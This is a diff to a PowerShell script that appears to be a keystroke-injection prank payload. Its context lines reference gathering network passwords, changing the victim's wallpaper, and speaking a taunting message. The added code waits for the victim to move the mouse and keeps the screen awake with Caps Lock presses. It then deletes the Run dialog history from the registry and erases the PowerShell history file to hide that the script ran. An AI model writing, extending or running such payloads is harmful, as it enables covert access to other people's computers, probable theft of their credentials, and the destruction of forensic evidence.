@@ -242,7 +242,38 @@ $Networks = Get-Networks
 $passLength = $pass.Length
 
 
+# caps lock indicator light
+$blinks = 3; $o = New-Object -ComObject WScript.Shell; for ($num = 1 ; $num -le $blinks * 2; $num++) { $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Milliseconds 250 }
 
+
+
+#-----------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	Then the script will be paused until the mouse is moved 
+	script will check mouse position every indicated number of seconds
+	This while loop will constantly check if the mouse has been moved 
+	"CAPSLOCK" will be continously pressed to prevent screen from turning off
+	it will then sleep for the indicated number of seconds and check again
+	when mouse is moved it will break out of the loop and continue theipt
+#>
+
+
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+
+while (1) {
+    $pauseTime = 3
+    if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS) {
+        break
+    }
+    else {
+        $o.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds $pauseTime
+    }
+}
+echo "it worked"
 
 
 $wshell = New-Object -ComObject Wscript.Shell
@@ -297,6 +328,23 @@ Set-WallPaper -Image $Image -Style "Fit"
 $s.Sleep(2000)
 
 $s.Speak("Have a look at your desktop, il be waiting here...")
+
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true) {
+
+    $key = New-Object -ComObject WScript.Shell
+    $key.SendKeys('{CapsLock}')
+}
 
 
 <#
